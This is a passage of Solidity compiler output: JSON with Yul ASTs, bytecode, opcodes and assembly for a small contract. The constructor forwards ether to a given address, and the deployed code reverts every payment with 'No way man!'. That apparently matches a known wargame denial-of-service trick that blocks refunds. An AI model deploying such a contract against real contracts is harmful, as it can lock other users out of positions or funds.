															"nodeType": "YulAssignment",
															"src": "2078:154:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2228:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2085:141:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2085:147:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "2078:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2242:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "2249:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "2242:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "2054:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "2063:3:1",
														"type": ""
													}
												],
												"src": "1879:379:1"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(memPtr) {\n\n    }\n\n    function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)\n        store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(pos)\n        end := add(pos, 0)\n    }\n\n    function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos ) -> end {\n\n        pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)\n\n        end := pos\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "6080604052604051610262380380610262833981810160405281019061002591906100f7565b8073ffffffffffffffffffffffffffffffffffffffff163460405161004990610155565b60006040518083038185875af1925050503d8060008114610086576040519150601f19603f3d011682016040523d82523d6000602084013e61008b565b606091505b5050505061016a565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100c482610099565b9050919050565b6100d4816100b9565b81146100df57600080fd5b50565b6000815190506100f1816100cb565b92915050565b60006020828403121561010d5761010c610094565b5b600061011b848285016100e2565b91505092915050565b600081905092915050565b50565b600061013f600083610124565b915061014a8261012f565b600082019050919050565b600061016082610132565b9150819050919050565b60ea806101786000396000f3fe60806040526040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016034906096565b60405180910390fd5b600082825260208201905092915050565b7f4e6f20776179206d616e21000000000000000000000000000000000000000000600082015250565b60006082600b83603d565b9150608b82604e565b602082019050919050565b6000602082019050818103600083015260ad816077565b905091905056fea26469706673582212200d14ef600b13c07c30498ef510ccb41fb52d2c08ed82e7ff6fe09dbcce71e0ec64736f6c634300080f0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x262 CODESIZE SUB DUP1 PUSH2 0x262 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x25 SWAP2 SWAP1 PUSH2 0xF7 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD PUSH2 0x49 SWAP1 PUSH2 0x155 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x86 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x8B JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP PUSH2 0x16A JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC4 DUP3 PUSH2 0x99 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xD4 DUP2 PUSH2 0xB9 JUMP JUMPDEST DUP2 EQ PUSH2 0xDF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xF1 DUP2 PUSH2 0xCB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x10D JUMPI PUSH2 0x10C PUSH2 0x94 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x11B DUP5 DUP3 DUP6 ADD PUSH2 0xE2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x13F PUSH1 0x0 DUP4 PUSH2 0x124 JUMP JUMPDEST SWAP2 POP PUSH2 0x14A DUP3 PUSH2 0x12F JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x160 DUP3 PUSH2 0x132 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0xEA DUP1 PUSH2 0x178 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x34 SWAP1 PUSH1 0x96 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E6F20776179206D616E21000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x82 PUSH1 0xB DUP4 PUSH1 0x3D JUMP JUMPDEST SWAP2 POP PUSH1 0x8B DUP3 PUSH1 0x4E JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH1 0xAD DUP2 PUSH1 0x77 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD EQ 0xEF PUSH1 0xB SGT 0xC0 PUSH29 0x30498EF510CCB41FB52D2C08ED82E7FF6FE09DBCCE71E0EC64736F6C63 NUMBER STOP ADDMOD 0xF STOP CALLER ",
							"sourceMap": "60:237:0:-:0;;;89:129;;;;;;;;;;;;;;;;;;;;;:::i;:::-;160:22;152:36;;196:9;152:58;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;89:129;60:237;;88:117:1;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;1202:147::-;1303:11;1340:3;1325:18;;1202:147;;;;:::o;1355:114::-;;:::o;1475:398::-;1634:3;1655:83;1736:1;1731:3;1655:83;:::i;:::-;1648:90;;1747:93;1836:3;1747:93;:::i;:::-;1865:1;1860:3;1856:11;1849:18;;1475:398;;;:::o;1879:379::-;2063:3;2085:147;2228:3;2085:147;:::i;:::-;2078:154;;2249:3;2242:10;;1879:379;;;:::o;60:237:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_26": {
									"entryPoint": null,
									"id": 26,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_stringliteral_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360_to_t_string_memory_ptr_fromStack": {
									"entryPoint": 119,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": 150,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_string_memory_ptr_fromStack": {
									"entryPoint": 61,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"store_literal_in_memory_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360": {
									"entryPoint": 78,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1143:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "103:73:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "120:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "125:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "113:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "113:19:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "113:19:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "141:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "160:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "165:4:1",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "156:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "156:14:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "141:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "75:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "80:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "91:11:1",
														"type": ""
													}
												],
												"src": "7:169:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "288:55:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "memPtr",
																				"nodeType": "YulIdentifier",
																				"src": "310:6:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "318:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "306:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "306:14:1"
																	},
																	{
																		"hexValue": "4e6f20776179206d616e21",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "322:13:1",
																		"type": "",
																		"value": "No way man!"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "299:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "299:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "299:37:1"
														}
													]
												},
												"name": "store_literal_in_memory_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "280:6:1",
														"type": ""
													}
												],
												"src": "182:161:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "495:220:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "505:74:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "571:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "576:2:1",
																		"type": "",
																		"value": "11"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "512:58:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "512:67:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "505:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "677:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360",
																	"nodeType": "YulIdentifier",
																	"src": "588:88:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "588:93:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "588:93:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "690:19:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "701:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "706:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "697:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "697:12:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "690:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360_to_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "483:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "491:3:1",
														"type": ""
													}
												],
												"src": "349:366:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "892:248:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "902:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "914:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "925:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "910:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "910:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "902:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "949:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "960:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "945:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "945:17:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nodeType": "YulIdentifier",
																				"src": "968:4:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "974:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "964:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "964:20:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "938:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "938:47:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "938:47:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "994:139:1",
															"value": {
																"arguments": [
																	{
																		"name": "tail",
																		"nodeType": "YulIdentifier",
																		"src": "1128:4:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360_to_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1002:124:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1002:131:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "994:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "872:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "887:4:1",
														"type": ""
													}
												],
												"src": "721:419:1"
											}
										]
									},
									"contents": "{\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function store_literal_in_memory_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360(memPtr) {\n\n        mstore(add(memPtr, 0), \"No way man!\")\n\n    }\n\n    function abi_encode_t_stringliteral_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 11)\n        store_literal_in_memory_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "60806040526040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016034906096565b60405180910390fd5b600082825260208201905092915050565b7f4e6f20776179206d616e21000000000000000000000000000000000000000000600082015250565b60006082600b83603d565b9150608b82604e565b602082019050919050565b6000602082019050818103600083015260ad816077565b905091905056fea26469706673582212200d14ef600b13c07c30498ef510ccb41fb52d2c08ed82e7ff6fe09dbcce71e0ec64736f6c634300080f0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x34 SWAP1 PUSH1 0x96 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E6F20776179206D616E21000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x82 PUSH1 0xB DUP4 PUSH1 0x3D JUMP JUMPDEST SWAP2 POP PUSH1 0x8B DUP3 PUSH1 0x4E JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH1 0xAD DUP2 PUSH1 0x77 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD EQ 0xEF PUSH1 0xB SGT 0xC0 PUSH29 0x30498EF510CCB41FB52D2C08ED82E7FF6FE09DBCCE71E0EC64736F6C63 NUMBER STOP ADDMOD 0xF STOP CALLER ",
							"sourceMap": "60:237:0:-:0;;;265:21;;;;;;;;;;:::i;:::-;;;;;;;;7:169:1;91:11;125:6;120:3;113:19;165:4;160:3;156:14;141:29;;7:169;;;;:::o;182:161::-;322:13;318:1;310:6;306:14;299:37;182:161;:::o;349:366::-;491:3;512:67;576:2;571:3;512:67;:::i;:::-;505:74;;588:93;677:3;588:93;:::i;:::-;706:2;701:3;697:12;690:19;;349:366;;;:::o;721:419::-;887:4;925:2;914:9;910:18;902:26;;974:9;968:4;964:20;960:1;949:9;945:17;938:47;1002:131;1128:4;1002:131;:::i;:::-;994:139;;721:419;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "46800",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"": "317"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 60,
									"end": 297,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 60,
									"end": 297,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 60,
									"end": 297,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 89,
									"end": 218,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 89,
									"end": 218,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 89,
									"end": 218,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 89,
									"end": 218,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 89,
									"end": 218,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 89,
									"end": 218,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 152,
									"end": 188,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 152,
									"end": 188,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 196,
									"end": 205,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 152,
									"end": 210,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "tag",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "DUP6",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "DUP8",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "GAS",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "CALL",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "RETURNDATASIZE",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 152,
									"end": 210,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 152,
									"end": 210,
									"name": "EQ",
									"source": 0
								},
								{
									"begin": 152,
